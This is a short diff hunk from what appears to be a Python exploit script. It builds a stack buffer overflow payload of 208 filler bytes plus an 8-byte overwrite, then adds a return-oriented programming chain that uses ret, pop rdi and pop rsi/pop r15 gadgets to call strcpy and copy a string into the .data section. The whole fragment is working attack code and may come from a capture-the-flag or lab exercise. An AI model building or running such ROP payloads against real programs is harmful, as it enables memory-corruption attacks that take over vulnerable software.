@@ -13,3 +13,12 @@ dummy = b'C' * 8
 
 buf = b'A' * 208
 buf += b'\x42' * 8
+
+# Copy 's' to .data section
+rop  = p64(ret)
+rop += p64(pop_rdi_ret)
+rop += p64(write_to)
+rop += p64(pop_rsi_pop_r15_ret)
+rop += p64(s_address)
+rop += dummy
+rop += p64(strcpy)
